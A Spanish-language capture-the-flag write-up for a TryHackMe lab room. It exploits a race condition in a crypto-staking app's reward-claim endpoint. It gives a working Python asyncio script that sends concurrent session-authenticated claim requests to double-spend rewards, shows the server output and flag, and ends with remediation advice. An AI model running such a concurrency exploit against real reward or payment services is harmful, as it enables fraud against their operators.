---
title: "Towel on the Sunbed"
date: 2026-08-03 18:30:00 -0400
description: "Explotación de una condición de carrera (Race Condition / TOCTOU) en el endpoint de reclamo de recompensas de una app de staking cripto, permitiendo un double-spend para alcanzar el tier Whale y desbloquear la Whale Vault."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [web, race-condition, toctou, asyncio, aiohttp, medium]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026 — Towel on the Sunbed
> - **Dificultad:** Media
> - **Categoría:** Web
> - **Técnicas Clave:** Análisis de lógica de negocio, Race Condition / TOCTOU, explotación de concurrencia con `asyncio` + `aiohttp`, robo de sesión vía cookie
{: .prompt-info }

## Introducción

*Ponzi — Wellness Rewards* es una aplicación de staking cripto que permite a cada usuario reclamar **50 PONZI** cada 24 horas mediante un botón de "Claim Reward". Al alcanzar **150 PONZI**, el usuario asciende a tier *Whale* y desbloquea el acceso a la **Whale Vault**, donde se encuentra la flag.

El propio briefing del reto ya insinúa la vulnerabilidad:

> *"Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through."*
> *"bro really thinks the clock is the only thing checking him."*

Esto apunta directamente a una condición de carrera en la verificación del cooldown de 24 horas.

## Reconocimiento

Al acceder a `http://10.65.128.126:3000/auth/login`, se encuentra un flujo de autenticación estándar con registro y login.

Inspeccionando el código fuente (`Ctrl+U`) y los scripts del cliente (`/js/auth.js`, `/js/dashboard.js`), se identifica lo siguiente:

- El registro y login envían credenciales vía `fetch()` en JSON a `/auth/register` y `/auth/login`.
- El dashboard consulta `GET /dashboard/api/me`, que devuelve `balance`, `tier`, `canClaim` y `secondsUntilClaim`.
- El botón **Claim Reward** dispara `POST /claim`, sin body ni parámetros — autenticado únicamente por la cookie de sesión (`connect.sid`).
- El botón **Open Vault** dispara `GET /vault`, habilitado solo cuando `balance >= 150`.

```javascript
const WHALE_THRESHOLD = 150;
...
document.getElementById('claim-btn').addEventListener('click', async () => {
    const resp = await fetch('/claim', { method: 'POST' });
    ...
});
```

Con esto queda claro el objetivo: `POST /claim` es el único endpoint que suma balance, y todo depende de cómo el servidor valide el cooldown de 24 horas.

> El primer paso ante cualquier reto de "recompensas" o "cooldown" es revisar si la verificación de tiempo y la actualización del estado ocurren como una sola operación atómica en el backend, o como dos pasos separados.
{: .prompt-tip }

## Análisis de la vulnerabilidad

El flujo esperado en el servidor es, en esencia:

1. **Check:** consultar si `lastClaimTime` del usuario tiene más de 24h.
2. **Use:** si es válido, sumar 50 PONZI al balance y actualizar `lastClaimTime`.

Cuando estos dos pasos no se ejecutan de forma atómica (sin transacción con lock, sin `UPDATE` condicional, sin `findOneAndUpdate` atómico), múltiples peticiones concurrentes pueden pasar la verificación del paso 1 **antes** de que cualquiera de ellas alcance a escribir el resultado del paso 2. Esto es un **TOCTOU (Time-Of-Check to Time-Of-Use)**, también conocido en sistemas financieros como *double-spend*.

## Explotación

### Preparar una cuenta "limpia"

Es fundamental usar una cuenta que **nunca haya reclamado manualmente**. Un solo clic consume el claim de forma serial (una petición a la vez) y no dispara la condición de carrera. Se registró una cuenta nueva y se capturó la cookie de sesión (`connect.sid`) desde DevTools sin interactuar con el botón de claim.

> Si ya reclamaste manualmente con una cuenta, quedas bloqueado por el cooldown real de 24h. Registra una cuenta nueva para tener la ventana de ataque intacta.
{: .prompt-warning }

### Disparar peticiones concurrentes

Se utilizó Python con `asyncio` + `aiohttp` para enviar peticiones `POST /claim` verdaderamente concurrentes (no secuenciales), autenticadas con la cookie de sesión robada del navegador:

```python
import asyncio
import aiohttp

TARGET = "http://10.65.128.126:3000"
COOKIES = {
    "connect.sid": "s%3A...tu_cookie_de_sesion..."
}

N_REQUESTS = 30

async def claim(session, i):
    async with session.post(f"{TARGET}/claim") as resp:
        status = resp.status
        try:
            data = await resp.json()
        except Exception:
            data = await resp.text()
        print(f"[{i}] status={status} -> {data}")

async def main():
    async with aiohttp.ClientSession(cookies=COOKIES) as session:
        tasks = [claim(session, i) for i in range(N_REQUESTS)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

Entorno usado (Fedora + fish shell):

```bash
python3 -m venv venv
source venv/bin/activate.fish
pip install aiohttp
python3 exploit.py
```

> En fish shell, el script de activación estándar (`activate`) no funciona porque tiene sintaxis de bash. Usa `activate.fish` en su lugar.
{: .prompt-tip }

### Resultado

De las 30 peticiones enviadas simultáneamente, varias lograron "ganar la carrera" antes de que el servidor registrara el primer claim como completado:

```text
[7]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300, 'tier': 'Whale', 'priceSnapshot': 4.2}
[4]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300, 'tier': 'Whale', 'priceSnapshot': 4.2}
[9]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300, 'tier': 'Whale', 'priceSnapshot': 4.2}
[2]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300, 'tier': 'Whale', 'priceSnapshot': 4.2}
[8]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 300, 'tier': 'Whale', 'priceSnapshot': 4.2}
[3]  status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 400, 'tier': 'Whale', 'priceSnapshot': 4.2}
[11] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450, 'tier': 'Whale', 'priceSnapshot': 4.2}
[13] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450, 'tier': 'Whale', 'priceSnapshot': 4.2}
[22] status=200 -> {'message': 'Staking reward claimed successfully.', 'reward': 50, 'newBalance': 450, 'tier': 'Whale', 'priceSnapshot': 4.2}
...
[12] status=429 -> {'error': 'Reward already claimed. Please wait before claiming again.', 'secondsRemaining': 86400}
```

El resto de las peticiones recibió `429 Too Many Requests`, indicando que el servidor sí terminó por aplicar el bloqueo — pero para entonces ya era tarde: el balance final quedó en **450 PONZI**, muy por encima del umbral de 150 requerido.

## Obtención de la flag

Con el balance por encima de 150 PONZI, el botón **Open Vault** queda habilitado. Se puede acceder desde el navegador o directamente vía `curl`:

```bash
curl -s http://10.65.128.126:3000/vault \
  -H "Cookie: connect.sid=<tu_cookie_de_sesion>"
```

Respuesta del servidor:

```json
{
  "message": "Welcome to the Whale Vault.",
  "flag": "THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}",
  "balance": 450
}
```

🚩 **Flag:** `THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}`

## Remediación

- **Actualizaciones atómicas a nivel de base de datos**, condicionando el `UPDATE` al estado vigente en el momento exacto de la escritura:

```sql
UPDATE users
SET balance = balance + 50, last_claim = NOW()
WHERE id = :userId AND last_claim <= NOW() - INTERVAL '24 hours';
```

- **Locks explícitos** (`SELECT ... FOR UPDATE` en SQL, o locks a nivel de documento en NoSQL) antes de leer y escribir el estado.
- **Locking a nivel de aplicación**, por ejemplo un lock distribuido con Redis (`SETNX` + expiración) por usuario, para serializar peticiones concurrentes al endpoint sensible.
- **Rate limiting** como capa adicional de defensa, sin sustituir la corrección de la lógica atómica subyacente.

## Conclusión / Retroalimentación

Este reto es un excelente recordatorio de que los controles basados en tiempo (cooldowns, timers, límites diarios) **no bastan por sí solos** si la lógica de verificación y actualización del estado no está protegida por operaciones atómicas. El atacante no necesita "engañar al reloj" — solo necesita llegar antes de que el servidor termine de escribir.

La sala está muy bien diseñada: el briefing narrativo ya da pistas directas sobre la naturaleza de la vulnerabilidad sin regalar la solución, y el escenario (una app de "rewards" cripto) hace que el impacto de un bug de *double-spend* se sienta muy real, ya que es el mismo tipo de fallo que ha afectado a exchanges y sistemas bancarios en el mundo real. Como aprendizaje clave, queda claro que cualquier endpoint que combine "verificar condición" + "actualizar estado" merece ser auditado específicamente contra condiciones de carrera, más allá de si tiene rate limiting o no.
